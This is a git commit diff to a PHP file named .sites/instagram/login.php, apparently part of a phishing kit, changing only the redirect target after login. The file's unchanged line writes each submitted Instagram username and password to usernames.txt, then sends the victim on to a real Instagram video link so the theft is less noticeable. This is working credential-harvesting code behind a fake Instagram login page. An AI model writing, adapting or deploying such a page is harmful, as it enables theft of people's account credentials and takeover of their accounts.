692163e9ddc74aecfa6a2bc18e0acc510d6b978f
Ron4r <99353505+Ron4r@users.noreply.github.com>
2022-02-09 20:29:58 +0200

    Update login.php

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://xxx.com');
+header('Location: https://www.instagram.com/tv/CZwsbmHA8b0/?utm_source=ig_web_copy_link');
 exit();
 ?>
